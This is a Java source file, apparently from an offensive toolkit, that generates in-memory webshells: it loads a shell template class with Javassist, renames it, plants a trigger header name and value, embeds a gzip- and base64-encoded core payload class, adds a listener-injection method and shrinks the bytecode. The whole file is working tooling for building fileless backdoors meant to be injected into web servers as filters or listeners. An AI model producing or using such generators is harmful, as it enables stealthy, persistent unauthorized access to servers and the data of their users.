package org.leo.jmg.mem.shell;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.leo.core.util.asm.ClassFileMinimizer;
import org.leo.jmg.ShellGeneratorConfig;
import org.leo.jmg.util.base64.Base64Utils;
import org.leo.jmg.util.javassist.JavassistUtil;
import org.leo.jmg.util.response.ResponseUtil;

import java.io.InputStream;

public class ShellGenerator {

    /**
     * 基于模板类生成内存 Shell
     *
     * @param shellTplName  模板类全限定名（如 org.leo.jmg.mem.shell.http.LeoFilterTpl）
     * @return 生成后的 Shell 类字节码（已做最小化处理）
     */
    public byte[] makeShell(ShellGeneratorConfig config, String shellTplName) throws Exception {
        // 每次操作创建完全独立的池（parent=null），避免模板类被 getDefault() 父池缓存后
        // makeClass() 抛出 "is in a parent ClassPool" 错误
        ClassPool pool = new ClassPool(null);
        pool.appendSystemPath();

        // 从模板类字节码克隆出一个新的 CtClass，避免直接修改模板本身
        String classPath = shellTplName.replace('.', '/') + ".class";
        String resourcePath = "shell-template/" + classPath;

        // shell 模板从 resources/shell-template 下读取，避免依赖模板类可被 Class.forName 加载
        try (InputStream is = Thread.currentThread().getContextClassLoader().getResourceAsStream(resourcePath)) {
            if (is == null) {
                throw new RuntimeException("Cannot find shell template class bytes from resource: " + resourcePath
                        + " (shellTplName=" + shellTplName + ")");
            }

            // 保证能够解析依赖类（以当前模块 classpath 为准）
            pool.insertClassPath(new ClassClassPath(ShellGenerator.class));
            CtClass ctClass = pool.makeClass(is);
            try {
                // 改名为用户指定的 Shell 类名
                ctClass.setName(config.getShellClassName());
                // 统一降到 Java 5，减小兼容性问题
                ctClass.getClassFile().setVersionToJava5();

                // 用实际配置替换模板中的静态字段
                replaceStaticField(ctClass, "headerName",
                        "private static String headerName = \"" + escapeForJavaString(config.getHeaderName()) + "\";");
                replaceStaticField(ctClass, "headerValue",
                        "private static String headerValue = \"" + escapeForJavaString(config.getHeaderValue()) + "\";");
                replaceStaticField(ctClass, "coreClassName",
                        "private static String coreClassName = \"" + escapeForJavaString(config.getCoreClassName()) + "\";");
                // coreClass 直接写入字符串，调用方需要保证其内容已经做好压缩/编码
                replaceStaticField(ctClass, "coreClass",
                        "private static String coreClass = \"" + escapeForJavaString(Base64Utils.gzipAndBase64(config.getCoreClassBytes())) + "\";");
                replaceStaticField(ctClass, "respCode",
                        "private static int respCode = " + config.getRespCode() + ";");

                if (config.getShellType().equals("ListenerInjector")) {
                    String methodBody = ResponseUtil.getMethodBody(config.getServerType());
                    JavassistUtil.addMethod(ctClass, "getResponseFromRequest", methodBody);
                }

                // 输出并做一次瘦身
                byte[] bytes = ctClass.toBytecode();
                return ClassFileMinimizer.transform(bytes);
            } finally {
                ctClass.detach();
            }
        }
    }

    /**
     * 使用新的定义替换已有静态字段
     */
    private void replaceStaticField(CtClass ctClass, String fieldName, String newFieldSrc) throws Exception {
        try {
            CtField oldField = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(oldField);
        } catch (Exception ignored) {
            // 如果模板里不存在该字段，直接添加即可
        }
        ctClass.addField(CtField.make(newFieldSrc, ctClass));
    }

    /**
     * 将普通字符串转义为可安全写入 Java 字面量的形式
     */
    private String escapeForJavaString(String str) {
        if (str == null) {
            return "";
        }
        return str
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\r", "\\r")
                .replace("\n", "\\n");
    }
}

